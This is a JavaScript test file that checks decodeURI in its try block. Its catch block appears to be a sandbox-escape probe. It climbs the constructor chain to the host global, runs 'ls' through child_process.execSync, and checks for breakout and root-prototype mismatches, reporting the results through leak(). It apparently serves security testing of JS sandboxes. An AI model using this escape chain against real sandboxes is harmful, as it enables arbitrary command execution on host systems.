try {
    if (decodeURI('') !== '') {
        $ERROR('#1: ""');
    }
    if (decodeURI('http:%2f%2Funipro.ru') !== 'http:%2f%2Funipro.ru') {
        $ERROR('#2: http:%2f%2Funipro.ru');
    }
    if (decodeURI('http://www.google.ru/support/jobs/bin/static.py%3Fpage%3dwhy-ru.html%26sid%3Dliveandwork') !== 'http://www.google.ru/support/jobs/bin/static.py%3Fpage%3dwhy-ru.html%26sid%3Dliveandwork') {
        $ERROR('#3: http://www.google.ru/support/jobs/bin/static.py%3Fpage%3dwhy-ru.html%26sid%3Dliveandwork"');
    }
    if (decodeURI('http://en.wikipedia.org/wiki/UTF-8%23Description') !== 'http://en.wikipedia.org/wiki/UTF-8%23Description') {
        $ERROR('%234: http://en.wikipedia.org/wiki/UTF-8%23Description');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}